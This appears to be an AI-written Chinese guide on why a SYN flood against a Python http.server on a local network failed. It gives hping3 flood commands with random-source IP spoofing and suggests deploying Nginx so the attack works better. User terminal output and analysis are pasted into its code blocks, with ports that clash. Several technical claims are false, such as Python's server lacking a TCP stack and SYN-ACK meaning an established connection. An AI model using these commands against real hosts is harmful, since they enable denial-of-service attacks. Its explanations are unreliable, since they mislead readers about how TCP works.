SYN 洪泛攻击无效的情况，可能有以下几个原因：

### 1. **目标 IP 地址问题**
   - 确认 `192.168.31.109` 确实是运行 Python Web 服务的机器 IP
   - **检查方法**：
     ```bash
     ifconfig  # Linux/Mac
     ipconfig  # Windows
     ```
     确保你攻击的是正确的本地 IP（而不是 `127.0.0.1` 或公网 IP）

### 2. **Python 的 `http.server` 不处理半连接**
   - Python 内置的 `http.server` 是单线程的简单实现，可能没有完整实现 TCP 协议栈
   - **关键现象**：它不会像 Nginx/Apache 那样维护半连接队列（SYN_RECV 状态）
   - **验证方法**：
     ```bash
     netstat -ant | grep SYN_RECV  # 攻击期间应该看不到大量半连接
     ```

### 3. **hping3 命令需要调整**
   - 添加 `--rand-source` 伪造随机源 IP（否则容易被系统丢弃）
   - 完整命令：
     ```bash
     sudo hping3 -S 192.168.31.109 -p 8000 --flood --rand-source
     ```

### 4. **系统默认丢弃无效 SYN 包**
   - 现代操作系统对 SYN 洪水有基础防护
   - **检查系统日志**：
     ```bash
     dmesg | grep -i drop  # 查看是否内核丢弃了包
     ```

---

### 正确测试方法（推荐）
如果想看到明显的攻击效果：

1. **改用专业的 Web 服务器**：
   ```bash
   # 安装 Nginx
   sudo apt install nginx
   sudo systemctl start nginx
   ```

2. **攻击 Nginx 默认端口（80）**：
   ```bash
   sudo hping3 -S 192.168.31.109 -p 80 --flood --rand-source

   (base) shaofu@shaofu:~$ sudo hping3 -S 127.0.0.1 -p 80 --rand-source -V
   using lo, addr: 127.0.0.1, MTU: 65536
   HPING 127.0.0.1 (lo 127.0.0.1): S set, 40 headers + 0 data bytes
   len=44 ip=127.0.0.1 ttl=64 DF id=0 tos=0 iplen=44
   sport=80 flags=SA seq=2 win=65495 rtt=1.3 ms
   seq=712013983 ack=582001061 sum=c06a urp=0

   len=44 ip=127.0.0.1 ttl=64 DF id=0 tos=0 iplen=44
   sport=80 flags=SA seq=109 win=65495 rtt=0.4 ms
   seq=1752536412 ack=1709013321 sum=9f3b urp=0

   len=44 ip=127.0.0.1 ttl=64 DF id=0 tos=0 iplen=44
   sport=80 flags=SA seq=110 win=65495 rtt=1.1 ms
   seq=3806565164 ack=977969450 sum=c2cd urp=0

   (base) shaofu@shaofu:~$ sudo hping3 -S 127.0.0.1 -p 80 --rand-source -V
   using lo, addr: 127.0.0.1, MTU: 65536
   HPING 127.0.0.1 (lo 127.0.0.1): S set, 40 headers + 0 data bytes
   len=44 ip=127.0.0.1 ttl=64 DF id=0 tos=0 iplen=44
   sport=80 flags=SA seq=2 win=65495 rtt=1.3 ms
   seq=712013983 ack=582001061 sum=c06a urp=0

   len=44 ip=127.0.0.1 ttl=64 DF id=0 tos=0 iplen=44
   sport=80 flags=SA seq=109 win=65495 rtt=0.4 ms
   seq=1752536412 ack=1709013321 sum=9f3b urp=0

   从 hping3 的输出来看，宿主机确实响应了 SYN-ACK（flags=SA），说明连接可能已进入 ESTABLISHED 状态，而非 SYN_RECV。

   分析输出：
   sport=8001 flags=SA seq=3 win=65535 rtt=4.2 ms
   SA 表示 SYN-ACK，说明宿主机已成功响应 SYN 请求。
   如果 SYN Cookies 启用，系统会立即发送 SYN-ACK，但不会将连接保留在队列中，因此 SYN_RECV 状态不会持久存在。
   ```

3. **观察效果**：
   - 在另一个终端运行：
     ```bash
     watch -n 1 "netstat -ant | grep SYN_RECV | wc -l"
     ```
   - 正常应看到半连接数快速上升
   - 用浏览器访问服务会变慢或超时

```bash
Every 1.0s: netstat -ant | grep SYN_RECV | wc -l                                                                               shaofu: Wed Apr 23 17:14:23 2025

385
```

```bash
Every 1.0s: dmesg | grep -i drop                                                                                               shaofu: Wed Apr 23 17:13:44 2025

[    0.386481] drop_monitor: Initializing network drop monitor service
[2719904.431123] ptrace attach of "/opt/google/chrome/chrome --type=utility --utility-sub-type=audio.mojom.AudioService --lang=zh-CN --service-sandbox-type=non
e --string-annotations --crashpad-handler-pid=3868 --enable-crash-reporter=, --change-stack-guard-on-fork=enable --shared-files=v8_context_snapshot_data:100 --
field-trial-handle=3,i,1570744617303147934,13470989366382690612,262144 --disable-features=EyeDropper --variations-seed-version=20250311-050106.243000"[4394] wa
s attempted by "strace -cfp 4394"[162563]
[3650070.207137] nf_conntrack: nf_conntrack: table full, dropping packet
[3650087.688089] nf_conntrack: nf_conntrack: table full, dropping packet
[3650148.807428] nf_conntrack: nf_conntrack: table full, dropping packet
[3656451.305789] nf_conntrack: nf_conntrack: table full, dropping packet
[3656456.795358] nf_conntrack: nf_conntrack: table full, dropping packet
[3656456.842436] nf_conntrack: nf_conntrack: table full, dropping packet
[3656456.897237] nf_conntrack: nf_conntrack: table full, dropping packet
[3656481.719768] nf_conntrack: nf_conntrack: table full, dropping packet
[3656684.102074] nf_conntrack: nf_conntrack: table full, dropping packet
[3656706.485324] nf_conntrack: nf_conntrack: table full, dropping packet
[3656706.767540] nf_conntrack: nf_conntrack: table full, dropping packet
[3656746.830342] nf_conntrack: nf_conntrack: table full, dropping packet
```

---

### 为什么 Python 服务"免疫"？
Python 的 `http.server` 本质是一个**单线程演示工具**，它的 TCP 处理非常简单：
1. 收到 SYN 后直接回复 SYN-ACK
2. 如果没有后续 ACK，系统内核会自动清理
3. 不维护复杂的连接状态表

而 Nginx/Apache 这类专业服务器会严格维护 TCP 状态机，因此更容易受到 SYN 洪水影响。